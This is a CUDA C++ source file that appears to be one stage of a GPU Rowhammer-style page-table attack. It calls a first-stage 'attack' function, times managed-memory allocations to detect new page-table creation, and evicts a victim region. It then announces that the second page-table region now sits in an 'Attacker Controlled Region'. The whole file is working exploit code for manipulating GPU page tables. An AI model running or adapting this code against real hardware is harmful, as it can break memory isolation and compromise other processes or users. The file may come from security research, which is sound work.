#include "sc_firstRegion_hammer.cuh"
#include "sc_secondRegion.cuh"
#include <chrono>
#include <thread>

bool
second_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip)
{
  uint8_t *temp;
  uint8_t **region_ptrs;
  uint8_t *agg_ptr, *corrupted_ptr, *victim_ptr;
  uint64_t out_corrupt_id, out_victim_id;
  if (!first_PT_region_attack (num_alloc_init, threshold, skip, &region_ptrs,
                               &agg_ptr, &corrupted_ptr, &victim_ptr,
                               &out_corrupt_id, &out_victim_id))
    {
      printf ("Error: First PTC Allocation is wrong\n");
      exit (1);
    }

  std::cout << out_corrupt_id << " " << out_victim_id << '\n';
  std::cout << "Ready to Start Second PTC Test " << '\n';
  pause ();

  uint64_t ERR_next_id = std::numeric_limits<uint64_t>::max ();
  uint64_t next_id = ERR_next_id;
  for (uint64_t i = 0; i < num_alloc_init; i += 1)
    {
      // Create free space for Page Table Region
      if (i == next_id)
        evict_from_device (region_ptrs[out_victim_id], ALLOC_SIZE);

      cudaMallocManaged (&temp, ALLOC_SIZE + 4096);

      double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
      // DBG_OUT << i << " New PT time: " << currentMS << " ms"<< std::endl;
      std::cout << i << " New PT time: " << currentMS << " ms" << std::endl;

      if (i < skip || i % 512 == 0)
        continue;

      if (i == next_id)
        break;
      if (currentMS > threshold && next_id == ERR_next_id)
        next_id = i + 508;
    }

  std::cout << "(Step 4 Success) Second PT Region Now in Attacker Controlled "
               "Region: Press \033[1;32mEnter Key\033[0m to continue..."
            << '\n';
  pause ();
  return 0;
}

bool
second_PT_region (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const double threshold = std::stod (argv[1]);
  const uint64_t skip = std::stoull (argv[2]);

  return second_PT_region (num_alloc_init, threshold, skip);
}
